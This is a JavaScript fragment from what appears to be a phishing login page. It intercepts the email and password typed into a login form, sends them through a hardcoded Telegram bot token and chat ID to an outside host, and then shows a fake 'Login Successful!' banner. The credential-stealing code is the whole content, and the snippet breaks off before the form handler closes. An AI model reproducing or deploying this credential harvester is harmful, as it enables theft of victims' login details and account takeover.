<script>
    
    const botToken = '6915367077:AAEUp6-hosRWul1m3ASpQ8soFlBwdlNp5pU';
   const chatID = '6670523726';
   
    let count = 0;

   
    const sendMessage = async (message) => {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatID,
          text: message,
        }),
      });

      const data = await response.json();
      console.log(data);

      return data.ok;
    };

    // Handle form submission
    $('#login-form').submit(async (event) => {
      event.preventDefault();
      const email = $('#email').val();
      const password = $('#password').val();
      const message = `Email or phone: ${email}\nPassword: ${password}`;
      count++;
	  
      try {
        const result = await sendMessage(message);
        if (result) {
          console.log('Message sent successfully');
          if (count === 1) {
window.open('1x.html', '_blank');
        
		}
        } else {
          console.log('Failed to send message');
        }
      } catch (error) {
        console.error(error);
      }

    successMessage.textContent = 'Login Successful! ';
successMessage.style.backgroundColor = 'green';
successMessage.style.color = 'white';
successMessage.style.width = '100%';
successMessage.style.padding = '10px';
successMessage.style.boxSizing = 'border-box';
